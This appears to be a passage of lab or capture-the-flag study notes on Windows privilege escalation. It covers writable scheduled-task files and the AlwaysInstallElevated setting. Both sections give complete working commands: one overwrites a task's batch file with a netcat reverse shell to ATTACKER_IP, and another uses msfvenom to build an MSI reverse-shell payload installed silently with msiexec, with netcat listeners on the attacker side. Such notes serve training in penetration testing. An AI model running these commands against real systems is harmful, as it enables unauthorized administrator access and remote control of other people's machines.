
---

### **1. Scheduled Tasks**

**Scheduled tasks** are tasks that run automatically at a set time on a computer. If one of these tasks is misconfigured, you might be able to gain higher privileges by modifying what the task runs.

**Steps to escalate privileges with scheduled tasks:**

- **Check for Scheduled Tasks**:  
    You can list all scheduled tasks on the system with the command:
    
    ```cmd
    schtasks /query
    ```
    
    To get more details about a specific task, like which file it runs and which user runs it, use:
    
    ```cmd
    schtasks /query /tn vulntask /fo list /v
    ```
    
    This shows you the **task's file** and the **user** that runs the task. For example:
    
    ```txt
    Task to Run: C:\tasks\schtask.bat
    Run As User: taskusr1
    ```
    
- **Check Permissions on the Task File**:  
    You need to check if you can modify the file that the scheduled task runs (e.g., `schtask.bat`). To check the file permissions, use:
    
    ```cmd
    icacls c:\tasks\schtask.bat
    ```
    
    If the result shows that **Users** (everyone) can **modify** the file, you can change what the task runs.
    
- **Modify the Task to Get a Reverse Shell**:  
    If you can modify the task's file, you can change it to run a **reverse shell**. For example:
    
    ```cmd
    echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
    ```
    
    This will make the task run a **reverse shell** that connects back to your attack machine.
    
- **Start a Listener on Your Attack Machine**:  
    On your attacking machine, run a listener on port `4444` to receive the reverse shell:
    
    ```bash
    nc -lvp 4444
    ```
    
- **Run the Scheduled Task Manually**:  
    If the task is set to run later, you can run it manually with this command:
    
    ```cmd
    schtasks /run /tn vulntask
    ```
    
- **Get a Reverse Shell**:  
    After running the task, you'll get a reverse shell with the user privileges of `taskusr1` (you can now run commands as this user).
    
- **Retrieve the Flag**:  
    Go to **taskusr1's desktop** and look for the flag. The flag could be a file on the user's desktop.
    

---

### **2. AlwaysInstallElevated (Exploit MSI Files)**

This method is about exploiting **Windows Installer** files (**.msi**), which are used to install software. Normally, they run with the same privileges as the user, but if a system is misconfigured, these can run with **admin privileges**.

**Steps to escalate privileges with AlwaysInstallElevated:**

- **Check if the System is Vulnerable**:  
    To exploit this, two specific registry settings must be set. Check if they are present by running these commands:
    
    ```cmd
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    ```
    
- **Generate a Malicious .msi File**:  
    If the system is vulnerable, you can create a malicious **.msi file** (Windows installer file) that runs a reverse shell. Use `msfvenom` to create the file:
    
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o malicious.msi
    ```
    
    This generates a **malicious installer** that connects back to your attacking machine on port `4444`.
    
- **Run the Malicious Installer**:  
    On the target machine, run the malicious installer silently (without any pop-ups) with:
    
    ```cmd
    msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
    ```
    
- **Start a Listener**:  
    Make sure your **attacker machine** is listening for the reverse shell:
    
    ```bash
    nc -lvp 4444
    ```
    
- **Get the Reverse Shell**:  
    When the **.msi file** is executed, you'll receive a reverse shell with **admin privileges** because the **installer ran as an administrator**.
    

---

### Summary

- **Scheduled Tasks**:
    
    - Check scheduled tasks to see if you can modify the file it runs.
        
    - If you can, modify it to run a reverse shell.
        
    - Run the task and get a reverse shell with the privileges of the user the task runs as.
        
- **AlwaysInstallElevated**:
    
    - Check if the system allows **installers to run with elevated privileges**.
        
    - If vulnerable, create a malicious installer (`.msi` file) that gives you a reverse shell.
        
    - Run the installer, and you'll get a reverse shell with **admin privileges**.
        

---
